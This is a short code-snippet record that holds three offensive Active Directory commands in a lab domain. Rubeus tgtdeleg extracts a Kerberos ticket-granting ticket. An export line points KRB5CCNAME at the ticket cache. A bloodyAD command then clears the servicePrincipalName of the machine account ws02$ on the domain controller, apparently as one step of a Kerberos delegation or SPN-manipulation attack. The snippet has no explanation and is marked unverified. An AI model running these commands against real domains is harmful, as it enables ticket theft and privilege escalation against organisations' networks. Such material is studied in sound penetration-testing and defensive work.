---
id: 9b2014ad-8ed2-4391-aaf0-6395f299d727
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:06.137181+00:00'
updated_at: '2023-04-10T20:36:10.277684+00:00'
---

# Code Snippet 9b2014ad

**Language**: ps1

```ps1
Rubeus.exe tgtdeleg
export KRB5CCNAME=/tmp/ws02.ccache
python bloodyAD -d lab.local -u 'ws02$' -k --host dc.lab.local setAttribute 'CN=ws02,CN=Computers,DC=lab,DC=local' servicePrincipalName '[]'
```


